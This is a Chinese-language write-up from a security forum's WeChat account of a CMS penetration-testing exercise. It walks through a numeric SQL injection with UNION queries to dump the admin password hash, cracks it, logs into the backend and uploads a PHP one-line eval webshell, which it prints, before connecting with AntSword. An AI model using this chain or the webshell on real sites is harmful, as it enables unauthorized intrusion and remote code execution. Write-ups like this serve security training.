---
title: 记一次cms的web渗透测试练习
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458569720&idx=2&sn=1203af6eed26c51f7df361a559c2926f&chksm=b18dfb7286fa72641b3ff39ebf971fc027634485e9ca9b677540239590a7b95736bb995fb95c&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-08-28
fetch_date: 2025-10-06T18:04:21.811600
---

# 记一次cms的web渗透测试练习

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GOEgcHZMMUsDU8EDNvtUcZT8sSgPzshKwic1YiaiaYGicuJqoSPSO2CJKVscwOVwzdyEtiaia64AxIrytQ/0?wx_fmt=jpeg)

# 记一次cms的web渗透测试练习

mb\_mottwruq

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4atSgRDTWVa8UFvYLcdSI6rTLdxqy2qjazTHUM0BNmvLYsge8pGicee4g/640?wx_fmt=other&from=appmsg)

点击文章发现：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aF3qxLBnxnroIQFyoib6xBT1Xv7fK55Ib1yzhzia66HYiayb0t9vuNZuQA/640?wx_fmt=other&from=appmsg)

尝试进行sql注入。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aZkic03hnfs530IqDjjn0qiaA0BTTqFsfut8QFqnf580PbvVoiagWtB1Dw/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aLFTbhKbeNQUFbC4hRZzpDw0Iuo8dbbCSq5OFX8O6HXvex36BrNnrSg/640?wx_fmt=webp&from=appmsg)

得到漏洞为数字型。

通过order by语句得到字段总数为15。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aibHAuLw4dvZUNyHqsA7RRDLR7YhUQo8aI8h7oGvJ9JibhFJVqeb18e1g/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4agE2G82IMbUgRh4JF6ytUGRprtBVBhYRYtt5Mc2Pl24zhOjc62ia1tqg/640?wx_fmt=webp&from=appmsg)

通过union联合查询得到显示的字段编号。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aZfHkziaDM2H4MRkDibttswJa2ic4K7q3YKic38K9oJy4aQhT4NNKfZKGcA/640?wx_fmt=webp&from=appmsg)

将database()带入得到数据库名为cms。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4amDs84Etm79CHcwDRUkU18icqcGY2LX82CnsibJvFZHrCcWnNgiaOBedQw/640?wx_fmt=webp&from=appmsg)

接下来就是查表名、字段名、具体数据。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4a3ug54n5SFc41ACYyFCVEUaK4Bg5a5aDCPIXf9rwD6DBAdQOyPJUV2Q/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aNEnhfh5GW3DAA7VK4MWWG2ouG30LdbuNoHzSvq8v8dKOqw0uDT5b0Q/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aRBSq9lsSoxwsvc6f8m84g1mCZ2ibibmZZWc7zcichb5pwZxjSp2zUFGvA/640?wx_fmt=webp&from=appmsg)

发现密码经过加密，尝试解密。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4axicnxrnd7BibhbOuaGnlRTJqH83nWew8Iia8Igza6drk6GjziarHbNO6aA/640?wx_fmt=other&from=appmsg)

通过解密得知admin账户的密码为123456。

登陆后台。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aDIR0iaPDEajH9E3ib8N9uotkngG6VvANqe51AMO8bsWzgqaZcXpcGib5g/640?wx_fmt=webp&from=appmsg)

文件管理界面存在文件上传漏洞，尝试上传webshell。

```
<?php @eval($_POST[777])?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aY4VNsWPzA33MNtNRYia2RckqzehvBQ7grpX891yx7V482d8sxs77ZGQ/640?wx_fmt=webp&from=appmsg)

未做任何防护，上传成功！

用蚁剑连接webshell。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4a1CjQA6tj2dmFcsibQlUyIupiaBWSh6bKl2ibXo9021vSaXBqgpDCaUxww/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4agfzJDKCcX2Zx5DrZjNz2ARgj8IeMibABhIgsjepgfRMKs19q2o9Lugw/640?wx_fmt=webp&from=appmsg)

连接成功！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GN9FXQ7jXx6rV1dkJicVy4aFEgXD32BRya0z4zeDcCtOZYfjpz9wyDhckibzWdxrAyzKO9yLsU2UBg/640?wx_fmt=png&from=appmsg)

**看雪ID：mb\_mottwruq**

*https://bbs.kanxue.com/user-home-1004324.htm*

\*本文为看雪论坛优秀文章，由 mb\_mottwruq 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBO6HHAWKI6c8Q79r1rWiasguFeRFh81Al8OXDCjtD0KvgrJ48q4UUicrA/640?wx_fmt=png&from=appmsg)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458568532&idx=1&sn=fb8885887159cd8764d3d5e22b164e89&chksm=b18df7de86fa7ec8781c8973cd262ab347807003a6d767c51d90c9637b3d60cd54be3a4d7274&scene=21#wechat_redirect)

**# 往期推荐**

1、[Alt-Tab Terminator注册算法逆向](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458563181&idx=1&sn=1dd42dbb95362d9678431b94473ab1f4&chksm=b18d82e786fa0bf1681d92f0d13b064eeae9530e5b2e86f78fd7f4d2662bfaffe5e99993d08f&scene=21#wechat_redirect)

2、[恶意木马历险记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562562&idx=2&sn=1d66bb3141b820c717f86d349660e9ec&chksm=b18d808886fa099efc353521af0839c9bf5fbd4cae2985cf3a9a6ea28fa617f8300c0ab115a7&scene=21#wechat_redirect)

3、[VMP源码分析：反调试与绕过方法](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562488&idx=2&sn=fe5bd1498948137775db5f454bd5a6a2&chksm=b18d9f3286fa162491072b9cd141784c1a60b2b00fd8203f865c51ef753e3f45573a78810949&scene=21#wechat_redirect)

4、[Chrome V8 issue 1486342浅析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562487&idx=2&sn=b2d6ad2776d37f416933e1439f244430&chksm=b18d9f3d86fa162b5edfd1c8e616c9ea5460cf21afc5d41cfd8122fbc73830c61f125c8a4960&scene=21#wechat_redirect)

5、[Cython逆向-语言特性分析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562186&idx=1&sn=bd95ad7951c93578ed5f0cbb1971332c&chksm=b18d9e0086fa1716382e78c54135a0a296fa215688b9a741576d41897729625284287e598faf&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNp5aaC28Vzoibu2eYfSuD9d4nTJceKXwuR8oBEzcjMUPCLUMMgdAzQBA/640?wx_fmt=gif&from=appmsg)

点击阅读原文查看更多

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

看雪学苑

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过